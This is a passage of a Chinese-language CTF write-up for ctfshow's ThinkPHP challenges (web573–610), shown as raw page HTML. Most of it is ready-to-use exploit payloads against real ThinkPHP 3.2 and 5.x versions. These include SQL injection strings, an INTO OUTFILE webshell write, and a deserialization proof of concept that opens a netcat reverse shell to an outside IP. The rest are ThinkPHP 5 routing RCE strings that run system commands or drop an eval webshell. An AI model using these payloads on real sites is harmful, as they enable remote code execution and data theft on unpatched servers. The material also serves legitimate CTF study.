</span></span></code></pre></td></tr></table></div></div><p>然后设置</p><p><img src=/p/ctfshow-thinkphp-special/QQ20241016-220531.png width=698 height=492 srcset="/p/ctfshow-thinkphp-special/QQ20241016-220531_hu_282ca2f295ddf225.png 480w, /p/ctfshow-thinkphp-special/QQ20241016-220531_hu_f992c94d42fe1ee8.png 1024w" loading=lazy alt=1 class=gallery-image data-flex-grow=141 data-flex-basis=340px></p><p>然后拿到日志，日志里面是这个</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>[ 2021-04-15T14:49:32+08:00 ] 127.0.0.1 /index.php?showctf=%3C?php%20phpinfo();?%3E
</span></span></code></pre></td></tr></table></div></div><p>payload是这</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>/index.php?showctf=&lt;?php system(&#34;tac /f*&#34;);?&gt;
</span></span></code></pre></td></tr></table></div></div><h2 id=web573>web573</h2><p>3.2.3的sql注入漏洞，这里我们直接就注入就可以</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>?id[where]=0 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;ctfshow&#39;),3,4
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>?id[where]=0 union select 1,(select flag4s from flags),3,4
</span></span></code></pre></td></tr></table></div></div><p>注入手法很简单，不过还是可以审计一下的，先设置</p><p><code>/ThinkPHP/Conf/convention.php</code>，</p><p><img src=/p/ctfshow-thinkphp-special/QQ20241017-132644.png width=1254 height=648 srcset="/p/ctfshow-thinkphp-special/QQ20241017-132644_hu_7f3b2dad0cac81bf.png 480w, /p/ctfshow-thinkphp-special/QQ20241017-132644_hu_8cebc0deeee151b7.png 1024w" loading=lazy alt=1 class=gallery-image data-flex-grow=193 data-flex-basis=464px></p><p>在修改控制器文件代码为</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>class</span> <span class=nc>IndexController</span> <span class=k>extends</span> <span class=nx>Controller</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=nf>index</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>        <span class=nv>$data</span> <span class=o>=</span> <span class=nx>M</span><span class=p>(</span><span class=s1>&#39;users&#39;</span><span class=p>)</span><span class=o>-&gt;</span><span class=na>find</span><span class=p>(</span><span class=nx>I</span><span class=p>(</span><span class=s1>&#39;GET.id&#39;</span><span class=p>));</span>
</span></span><span class=line><span class=cl>        <span class=nx>var_dump</span><span class=p>(</span><span class=nv>$data</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>那么即可注入</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>?id[where]=0 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3
</span></span></code></pre></td></tr></table></div></div><h2 id=web574>web574</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>public</span> <span class=k>function</span> <span class=nf>index</span><span class=p>(</span><span class=nv>$id</span><span class=o>=</span><span class=mi>1</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=nv>$name</span> <span class=o>=</span> <span class=nx>M</span><span class=p>(</span><span class=s1>&#39;Users&#39;</span><span class=p>)</span><span class=o>-&gt;</span><span class=na>where</span><span class=p>(</span><span class=s1>&#39;id=&#39;</span><span class=o>.</span><span class=nv>$id</span><span class=p>)</span><span class=o>-&gt;</span><span class=na>find</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>show</span><span class=p>(</span><span class=nv>$html</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>?id=0) union select 1,2,3,4--+
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>?id=0) union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&#39;flags&#39;),3,4--+
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>?id=0) union select 1,(select flag4s from flags),3,4--+
</span></span></code></pre></td></tr></table></div></div><p>这里审计基本和上题一致</p><h2 id=web575>web575</h2><p>修改主控制器为</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=k>namespace</span> <span class=nx>Home\Controller</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>use</span> <span class=nx>Think\Controller</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>IndexController</span> <span class=k>extends</span> <span class=nx>Controller</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=nf>index</span><span class=p>(</span><span class=nv>$id</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=nv>$user</span><span class=o>=</span> <span class=nx>unserialize</span><span class=p>(</span><span class=nx>base64_decode</span><span class=p>(</span><span class=nx>cookie</span><span class=p>(</span><span class=s1>&#39;user&#39;</span><span class=p>)));</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=o>!</span><span class=nv>$user</span><span class=p>)</span> <span class=k>echo</span> <span class=s2>&#34;no&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=o>!</span><span class=nv>$user</span> <span class=o>||</span> <span class=nv>$user</span><span class=o>-&gt;</span><span class=na>id</span><span class=o>!==</span><span class=nv>$id</span><span class=p>){</span>
</span></span><span class=line><span class=cl>            <span class=nv>$user</span> <span class=o>=</span> <span class=nx>M</span><span class=p>(</span><span class=s1>&#39;Users&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=nv>$user</span><span class=o>-&gt;</span><span class=na>find</span><span class=p>(</span><span class=nx>intval</span><span class=p>(</span><span class=nv>$id</span><span class=p>));</span>
</span></span><span class=line><span class=cl>            <span class=nx>cookie</span><span class=p>(</span><span class=s1>&#39;user&#39;</span><span class=p>,</span><span class=nx>base64_encode</span><span class=p>(</span><span class=nx>serialize</span><span class=p>(</span><span class=nv>$user</span><span class=o>-&gt;</span><span class=na>data</span><span class=p>())));</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>show</span><span class=p>(</span><span class=nv>$user</span><span class=o>-&gt;</span><span class=na>username</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>很明显是username里面的问题，我们跟进<code>show</code>方法，跟进之后继续跟进fetch方法</p><p><img src=/p/ctfshow-thinkphp-special/QQ20250123-202837.jpg width=1130 height=741 srcset="/p/ctfshow-thinkphp-special/QQ20250123-202837_hu_82dc09ede933e824.jpg 480w, /p/ctfshow-thinkphp-special/QQ20250123-202837_hu_7fbaf9c5f4e34e0a.jpg 1024w" loading=lazy alt=1 class=gallery-image data-flex-grow=152 data-flex-basis=365px></p><p>这不是之前一样的？那我们直接反序列化进行RCE即可</p><p>写poc</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>namespace</span> <span class=nx>Home\Controller</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>IndexController</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$id</span><span class=o>=</span><span class=s1>&#39;1&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$username</span><span class=o>=</span><span class=s1>&#39;&lt;?php system(&#34;nc 156.238.233.9 9999 -e /bin/sh&#34;);?&gt;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nx>base64_encode</span><span class=p>(</span><span class=nx>serialize</span><span class=p>(</span><span class=k>new</span> <span class=nx>IndexController</span><span class=p>()));</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=web576>web576</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nv>$user</span> <span class=o>=</span> <span class=nx>M</span><span class=p>(</span><span class=s1>&#39;Users&#39;</span><span class=p>)</span><span class=o>-&gt;</span><span class=na>comment</span><span class=p>(</span><span class=nv>$id</span><span class=p>)</span><span class=o>-&gt;</span><span class=na>find</span><span class=p>(</span><span class=nx>intval</span><span class=p>(</span><span class=nv>$id</span><span class=p>));</span>
</span></span></code></pre></td></tr></table></div></div><p>跟进之后</p><p><img src=/p/ctfshow-thinkphp-special/QQ20250123-214601.jpg width=1006 height=438 srcset="/p/ctfshow-thinkphp-special/QQ20250123-214601_hu_bfecfc6717ea77d5.jpg 480w, /p/ctfshow-thinkphp-special/QQ20250123-214601_hu_3df2afbe8a4aa25a.jpg 1024w" loading=lazy alt=1 class=gallery-image data-flex-grow=229 data-flex-basis=551px></p><p>跟进到类里面得到<code>comment</code>的样子</p><p><img src=/p/ctfshow-thinkphp-special/QQ20250123-214709.jpg width=1553 height=992 srcset="/p/ctfshow-thinkphp-special/QQ20250123-214709_hu_4666f2cc4ac033eb.jpg 480w, /p/ctfshow-thinkphp-special/QQ20250123-214709_hu_3f78bb7aa303fe05.jpg 1024w" loading=lazy alt=1 class=gallery-image data-flex-grow=156 data-flex-basis=375px></p><p>再从这里跟进到新类</p><p><img src=/p/ctfshow-thinkphp-special/QQ20250123-214939.jpg width=1626 height=1126 srcset="/p/ctfshow-thinkphp-special/QQ20250123-214939_hu_1814d67668022595.jpg 480w, /p/ctfshow-thinkphp-special/QQ20250123-214939_hu_d708e401b11de9a1.jpg 1024w" loading=lazy alt=1 class=gallery-image data-flex-grow=144 data-flex-basis=346px></p><p><img src=/p/ctfshow-thinkphp-special/QQ20250123-215012.jpg width=1436 height=1021 srcset="/p/ctfshow-thinkphp-special/QQ20250123-215012_hu_7f4412c970e06254.jpg 480w, /p/ctfshow-thinkphp-special/QQ20250123-215012_hu_f41a1ca3826e5dc5.jpg 1024w" loading=lazy alt=1 class=gallery-image data-flex-grow=140 data-flex-basis=337px></p><p>这里利用注释闭合，然后写入shell</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=err>?</span><span class=n>id</span><span class=o>=</span><span class=mi>1</span><span class=o>*/</span> <span class=n>into</span> <span class=n>outfile</span> <span class=s2>&#34;/var/www/html/shell.php&#34;</span> <span class=n>LINES</span> <span class=n>STARTING</span> <span class=n>BY</span> <span class=s1>&#39;&lt;?php eval($_POST[1]);?&gt;&#39;</span><span class=o>%</span><span class=mi>23</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=web577>web577</h2><p><a class=link href=https://www.kancloud.cn/manual/thinkphp/1768 target=_blank rel=noopener>表达式查询</a></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=k>namespace</span> <span class=nx>Home\Controller</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>use</span> <span class=nx>Think\Controller</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>IndexController</span> <span class=k>extends</span> <span class=nx>Controller</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=nf>index</span><span class=p>(</span><span class=nv>$id</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=nv>$map</span><span class=o>=</span><span class=k>array</span><span class=p>(</span>
</span></span><span class=line><span class=cl>            <span class=s1>&#39;id&#39;</span><span class=o>=&gt;</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;id&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nv>$user</span> <span class=o>=</span> <span class=nx>M</span><span class=p>(</span><span class=s1>&#39;Users&#39;</span><span class=p>)</span><span class=o>-&gt;</span><span class=na>where</span><span class=p>(</span><span class=nv>$map</span><span class=p>)</span><span class=o>-&gt;</span><span class=na>find</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p><img src=/p/ctfshow-thinkphp-special/QQ20250124-113009.jpg width=1393 height=1059 srcset="/p/ctfshow-thinkphp-special/QQ20250124-113009_hu_c975b15b1a7a5b4f.jpg 480w, /p/ctfshow-thinkphp-special/QQ20250124-113009_hu_418c346420bfe0d4.jpg 1024w" loading=lazy alt=1 class=gallery-image data-flex-grow=131 data-flex-basis=315px></p><p>然后一直跟进到<code>Driver.class.php</code></p><p><img src=/p/ctfshow-thinkphp-special/QQ20250124-113224.jpg width=1629 height=1397 srcset="/p/ctfshow-thinkphp-special/QQ20250124-113224_hu_50ba7304870fa583.jpg 480w, /p/ctfshow-thinkphp-special/QQ20250124-113224_hu_c894444e36b82e31.jpg 1024w" loading=lazy alt=1 class=gallery-image data-flex-grow=116 data-flex-basis=279px></p><p>发现只要第一个参数是<code>bind</code>或者<code>exp</code>就会直接拼接查询语句</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>?id[0]=exp&amp;id[1]==0 union select 1,2,3,4--+
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>?id[0]=exp&amp;id[1]==0 union select 1,(select flag4s from flags),3,4--+
</span></span></code></pre></td></tr></table></div></div><h2 id=web-578>web 578</h2><p>变量覆盖RCE</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=k>namespace</span> <span class=nx>Home\Controller</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>use</span> <span class=nx>Think\Controller</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>IndexController</span> <span class=k>extends</span> <span class=nx>Controller</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=nf>index</span><span class=p>(</span><span class=nv>$name</span><span class=o>=</span><span class=s1>&#39;&#39;</span><span class=p>,</span><span class=nv>$from</span><span class=o>=</span><span class=s1>&#39;ctfshow&#39;</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>assign</span><span class=p>(</span><span class=nv>$name</span><span class=p>,</span><span class=nv>$from</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>display</span><span class=p>(</span><span class=s1>&#39;index&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p><img src=/p/ctfshow-thinkphp-special/QQ20250124-113932.jpg width=2365 height=1384 srcset="/p/ctfshow-thinkphp-special/QQ20250124-113932_hu_9d10992483dedcd2.jpg 480w, /p/ctfshow-thinkphp-special/QQ20250124-113932_hu_a4bf01355e295770.jpg 1024w" loading=lazy alt=1 class=gallery-image data-flex-grow=170 data-flex-basis=410px></p><p>首先assign方法进行参数赋值，继续跟进就会发现和之前研究的那个好像是一模一样</p><p><img src=/p/ctfshow-thinkphp-special/QQ20250124-114129.jpg width=1899 height=1356 srcset="/p/ctfshow-thinkphp-special/QQ20250124-114129_hu_b731e366153d7aa3.jpg 480w, /p/ctfshow-thinkphp-special/QQ20250124-114129_hu_4657ca71d2d2180.jpg 1024w" loading=lazy alt=1 class=gallery-image data-flex-grow=140 data-flex-basis=336px></p><p><img src=/p/ctfshow-thinkphp-special/QQ20250124-114953.jpg width=2328 height=1386 srcset="/p/ctfshow-thinkphp-special/QQ20250124-114953_hu_1b9596149d7bc471.jpg 480w, /p/ctfshow-thinkphp-special/QQ20250124-114953_hu_14cae81175169f99.jpg 1024w" loading=lazy alt=1 class=gallery-image data-flex-grow=167 data-flex-basis=403px></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>?name=_content&amp;from=&lt;?php system(&#34;whoami&#34;);?&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>?name[_content]=&lt;?php system(&#34;tac /f*&#34;);?&gt;
</span></span></code></pre></td></tr></table></div></div><h2 id=web-579>web 579</h2><p>tp5<strong>未开启强制路由RCE</strong></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=err>?</span><span class=n>s</span><span class=o>=</span><span class=n>index</span><span class=o>/</span>\<span class=n>think</span>\<span class=n>app</span><span class=o>/</span><span class=n>invokefunction</span><span class=o>&amp;</span><span class=n>function</span><span class=o>=</span><span class=n>call_user_func_array</span><span class=o>&amp;</span><span class=n>vars</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span><span class=o>=</span><span class=n>system</span><span class=o>&amp;</span><span class=n>vars</span><span class=p>[</span><span class=mi>1</span><span class=p>][</span><span class=mi>0</span><span class=p>]</span><span class=o>=</span><span class=n>whoami</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=web604>web604</h2><p>tp5<strong>未开启强制路由RCE</strong>，<strong>版本thinkphp 5.1.29</strong></p><p>换方法即可</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>?s=index/think\request/input?data[0]=ls ../../../../&amp;filter=system
</span></span></code></pre></td></tr></table></div></div><h2 id=web605>web605</h2><p><strong>未开启强制路由RCE-姿势3</strong></p><p><strong>版本thinkphp 5.1.29</strong>，用<code>write</code>写webshell</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>?s=index/\think\template\driver\File/write&amp;cacheFile=shell1.php&amp;content=&lt;?php @eval($_GET[1]);?&gt;
</span></span></code></pre></td></tr></table></div></div><h2 id=web606web610>web606&ndash;web610</h2><p><strong>未开启强制路由RCE-姿势4</strong></p><p><strong>版本thinkphp 5.1.29</strong>，直接大小写绕过即可，总共可用的方法为以下这几个</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>invokefunction、display、input、write
</span></span></code></pre></td></tr></table></div></div><p>poc为</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=err>?</span><span class=n>s</span><span class=o>=</span><span class=n>index</span><span class=o>/</span>\<span class=n>think</span>\<span class=n>app</span><span class=o>/</span><span class=n>invokeFunction</span><span class=o>&amp;</span><span class=n>function</span><span class=o>=</span><span class=n>call_user_func_array</span><span class=o>&amp;</span><span class=n>vars</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span><span class=o>=</span><span class=n>system</span><span class=o>&amp;</span><span class=n>vars</span><span class=p>[</span><span class=mi>1</span><span class=p>][</span><span class=mi>0</span><span class=p>]</span><span class=o>=</span><span class=n>ls</span> <span class=o>/</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=err>?</span><span class=n>s</span><span class=o>=</span><span class=n>index</span><span class=o>/</span><span class=n>think</span>\<span class=n>request</span><span class=o>/</span><span class=ne>Input</span><span class=err>?</span><span class=n>data</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span><span class=o>=</span><span class=n>ls</span> <span class=o>../../../../&amp;</span><span class=n>filter</span><span class=o>=</span><span class=n>system</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=err>?</span><span class=n>s</span><span class=o>=</span><span class=n>index</span><span class=o>/</span>\<span class=n>think</span>\<span class=n>template</span>\<span class=n>driver</span>\<span class=ne>File</span><span class=o>/</span><span class=n>Write</span><span class=o>&amp;</span><span class=n>cacheFile</span><span class=o>=</span><span class=n>shell1</span><span class=o>.</span><span class=n>php</span><span class=o>&amp;</span><span class=n>content</span><span class=o>=&lt;</span><span class=err>?</span><span class=n>php</span> <span class=err>@</span><span class=n>eval</span><span class=p>(</span><span class=o>$</span><span class=n>_GET</span><span class=p>[</span><span class=mi>1</span><span class=p>]);</span><span class=err>?</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=err>?</span><span class=n>s</span><span class=o>=</span><span class=n>index</span><span class=o>/</span>\<span class=n>think</span>\<span class=n>view</span>\<span class=n>driver</span>\<span class=n>Think</span><span class=o>/</span><span class=n>__call</span><span class=o>&amp;</span><span class=n>method</span><span class=o>=</span><span class=n>display</span><span class=o>&amp;</span><span class=n>params</span><span class=p>[]</span><span class=o>=&lt;</span><span class=err>?</span><span class=n>php</span> <span class=n>system</span><span class=p>(</span><span class=s1>&#39;cat /f*&#39;</span><span class=p>);</span> <span class=err>?</span><span class=o>&gt;</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=未开启强制路由rce动态调试>未开启强制路由RCE动态调试</h2><ul><li><strong>5.0.7 &lt;= ThinkPHP5 &lt;= 5.0.22</strong></li><li><strong>5.1.0 &lt;= ThinkPHP &lt;= 5.1.30</strong></li></ul><p>ctfshow里面的是5.1.*，但是这里都分析一下，先搭建环境，composer怎么搭建都搭不好，然后我在网上找到一个Docker可以用，<a class=link href=https://github.com/vulnspy/thinkphp-5.1.29 target=_blank rel=noopener>docker</a> 然后把里面的东西拖到小皮里面进行搭建最后发现成功了，poc全部都可以用</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=err>?</span><span class=n>s</span><span class=o>=</span><span class=n>index</span><span class=o>/</span>\<span class=n>think</span>\<span class=n>app</span><span class=o>/</span><span class=n>invokeFunction</span><span class=o>&amp;</span><span class=n>function</span><span class=o>=</span><span class=n>call_user_func_array</span><span class=o>&amp;</span><span class=n>vars</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span><span class=o>=</span><span class=n>system</span><span class=o>&amp;</span><span class=n>vars</span><span class=p>[</span><span class=mi>1</span><span class=p>][</span><span class=mi>0</span><span class=p>]</span><span class=o>=</span><span class=n>dir</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=err>?</span><span class=n>s</span><span class=o>=</span><span class=n>index</span><span class=o>/</span><span class=n>think</span>\<span class=n>request</span><span class=o>/</span><span class=ne>Input</span><span class=err>?</span><span class=n>data</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span><span class=o>=</span><span class=n>dir</span><span class=o>&amp;</span><span class=n>filter</span><span class=o>=</span><span class=n>system</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=err>?</span><span class=n>s</span><span class=o>=</span><span class=n>index</span><span class=o>/</span>\<span class=n>think</span>\<span class=n>template</span>\<span class=n>driver</span>\<span class=ne>File</span><span class=o>/</span><span class=n>Write</span><span class=o>&amp;</span><span class=n>cacheFile</span><span class=o>=</span><span class=n>shell1</span><span class=o>.</span><span class=n>php</span><span class=o>&amp;</span><span class=n>content</span><span class=o>=&lt;</span><span class=err>?</span><span class=n>php</span> <span class=err>@</span><span class=n>eval</span><span class=p>(</span><span class=o>$</span><span class=n>_GET</span><span class=p>[</span><span class=mi>1</span><span class=p>]);</span><span class=err>?</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=err>?</span><span class=n>s</span><span class=o>=</span><span class=n>index</span><span class=o>/</span>\<span class=n>think</span>\<span class=n>view</span>\<span class=n>driver</span>\<span class=n>Think</span><span class=o>/</span><span class=n>__call</span><span class=o>&amp;</span><span class=n>method</span><span class=o>=</span><span class=n>display</span><span class=o>&amp;</span><span class=n>params</span><span class=p>[]</span><span class=o>=&lt;</span><span class=err>?</span><span class=n>php</span> <span class=n>system</span><span class=p>(</span><span class=s1>&#39;dir&#39;</span><span class=p>);</span> <span class=err>?</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl>
